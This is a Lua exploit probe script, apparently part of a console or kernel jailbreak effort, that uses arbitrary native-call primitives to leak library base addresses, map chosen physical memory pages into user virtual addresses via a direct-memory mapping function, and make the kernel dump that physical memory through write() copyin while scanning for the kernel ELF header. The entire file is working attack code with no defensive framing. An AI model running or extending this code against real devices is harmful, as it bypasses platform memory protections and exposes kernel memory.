-- CRASH_CLASS: LOW
-- PROBE 562p: Read physical memory via kernel copyin (write syscall)
--
-- 562o: memory.read_dword(mapped_va) crashes (trace+death)
-- BUT: fn_addr works on main thread after MapDM (MapDM itself returns 0)
--
-- KEY INSIGHT: write(fd, buf, len) copies from buf via kernel copyin().
-- If copyin() runs in kernel space, it might bypass the userland trace.
-- The kernel reads mapped_va FOR us and sends it over the socket.
--
-- Plan:
-- 1. MapDM phys → VA
-- 2. fn_addr write(1, mapped_va, 64) — kernel reads from mapped_va
-- 3. Python receives 64 bytes of raw physical memory!
--
-- Also test: multiple physical addresses to find the kernel ELF header.

print("=== PROBE 562p: KERNEL COPYIN PHYS READ ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local sc477 = mk(477)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

-- Get module bases
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rd(N(ib) + 0x108) or 0; local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", ehi, elo, lhi, llo))
io.flush()

-- ============================================================
-- [A] Write start marker so Python knows where raw data begins
-- ============================================================
print("")
print("RAW_PHYS_START")
io.flush()

-- ============================================================
-- [B] MapDM phys 0x100000000 → VA 0x880000000
-- ============================================================
local mapped_va = uint64("0x880000000")
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)

-- Check MapDM worked
if not ok_md or N(rv_md) ~= 0 then
    print("MapDM FAILED rv=" .. (ok_md and N(rv_md) or -999))
    return
end

-- ============================================================
-- [C] fn_addr write(1, mapped_va, 256) — kernel copyin from phys page
-- ============================================================
local ok_wr, rv_wr = pcall(function()
    return native.fcall_with_rax(stub, 4,
        uint64(1), mapped_va, uint64(256))
end)

-- ============================================================
-- [D] Text marker for Python extraction
-- ============================================================
io.flush()
print("")
print("RAW_PHYS_END")
print(string.format("write_rv=%s", ok_wr and N(rv_wr) or "CRASH"))
io.flush()

-- ============================================================
-- [E] Try more physical addresses
-- ============================================================
local phys_addrs = {
    "0x000000000",  -- physical 0 (reset vector / BIOS area)
    "0x001000000",  -- 16MB
    "0x010000000",  -- 256MB
    "0x020000000",  -- 512MB
    "0x100000000",  -- already mapped above, skip
}

for idx, pa_str in ipairs(phys_addrs) do
    if pa_str ~= "0x100000000" then
        local va = uint64(string.format("0x%X", 0x8A0000000 + idx * 0x10000))
        pcall(function()
            sc477(va, uint64(0x4000), uint64(3),
                uint64(0x1012), uint64(0xFFFFFFFF), Z)
        end)
        local ok2, rv2 = pcall(function()
            return native.fcall_with_rax(mapdm_fn, 0,
                va, uint64(0x4000), uint64(3), Z,
                uint64(pa_str), uint64(0x4000))
        end)
        if ok2 and N(rv2) == 0 then
            print(string.format("\nphys %s:", pa_str))
            io.flush()
            local ok_w, rv_w = pcall(function()
                return native.fcall_with_rax(stub, 4,
                    uint64(1), va, uint64(64))
            end)
            io.flush()
            print(string.format("  write_rv=%s", ok_w and N(rv_w) or "CRASH"))
        else
            print(string.format("\nphys %s: MapDM FAIL rv=%s", pa_str,
                ok2 and N(rv2) or "crash"))
        end
        io.flush()
    end
end

-- ============================================================
-- [F] Alive check
-- ============================================================
print("")
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid_val and " ALIVE" or " DEAD"))
print("=== 562p DONE ===")
